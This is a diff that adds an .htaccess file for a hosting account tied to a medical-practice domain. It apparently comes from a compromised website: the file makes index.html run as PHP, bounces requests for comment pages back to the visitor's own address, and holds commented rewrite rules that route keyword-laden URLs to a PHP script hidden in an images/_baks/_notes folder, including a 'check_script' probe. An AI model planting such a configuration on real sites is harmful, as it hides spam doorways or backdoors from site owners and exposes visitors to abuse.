@@ -1,0 +1,11 @@
+suPHP_ConfigPath /hsphere/local/home/jzavalet/lascolinasobgyn.com
+RewriteEngine on
+RewriteRule ^(.*wp-comments.*)$ http://%{REMOTE_ADDR}/$ [R=301,L]
+
+<Files index.html>
+AddType application/x-httpd-php .html
+</Files>
+
+RewriteEngine on
+# RewriteRule ^is_working/$ ./images/_baks/_notes/postmenstrual.php?check_script=1
+# RewriteRule ^(ynwsv)(.*)/(.*)\.html$ ./images/_baks/_notes/postmenstrual.php?name=$3&word=$2&indx=$1 [L]
